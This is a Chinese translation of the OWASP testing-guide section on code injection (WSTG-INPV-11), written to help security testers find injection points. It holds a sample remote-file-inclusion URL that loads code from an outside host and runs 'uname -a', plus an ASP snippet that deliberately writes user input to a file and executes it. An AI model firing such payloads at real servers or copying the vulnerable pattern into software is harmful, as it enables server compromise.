# 测试代码注入

|ID          |
|------------|
|WSTG-INPV-11|

## 概述

本节介绍测试人员如何检查是否可以在网页上输入代码，并由 Web 服务器执行。

在[代码注入](https://owasp.org/www-community/attacks/Code_Injection)测试中，测试人员提交的输入由 Web 服务器作为动态代码或包含文件进行处理。这些测试可以针对各种服务器端脚本引擎，例如 ASP 或 PHP。需要采用适当的输入验证和安全编码实践来防御这些攻击。

## 测试目标

- 识别可将代码注入应用程序的注入点。
- 评估注入的严重性。

## 如何测试

### 黑盒测试

#### 测试 PHP 注入漏洞

使用查询字符串，测试人员可以注入代码（在此示例中为一个恶意 URL），使其作为包含文件的一部分被处理：

`https://www.example.com/uptime.php?pin=https://www.example2.com/packx1/cs.jpg?&cmd=uname%20-a`

> 恶意 URL 被接受为 PHP 页面的参数，该页面稍后将在包含文件中使用该值。

### 灰盒测试

#### 测试 ASP 代码注入漏洞

检查 ASP 代码中用于执行函数的用户输入。用户能否在 Data 输入字段中输入命令？以下 ASP 代码会将输入保存到文件，然后执行该文件：

```asp
<%
If not isEmpty(Request( "Data" ) ) Then
Dim fso, f
'用户输入 Data 被写入名为 data.txt 的文件
Set fso = CreateObject("Scripting.FileSystemObject")
Set f = fso.OpenTextFile(Server.MapPath( "data.txt" ), 8, True)
f.Write Request("Data") & vbCrLf
f.close
Set f = nothing
Set fso = Nothing

'执行 data.txt
Server.Execute( "data.txt" )

Else
%>

<form>
<input name="Data" /><input type="submit" name="Enter Data" />

</form>
<%
End If
%>
```
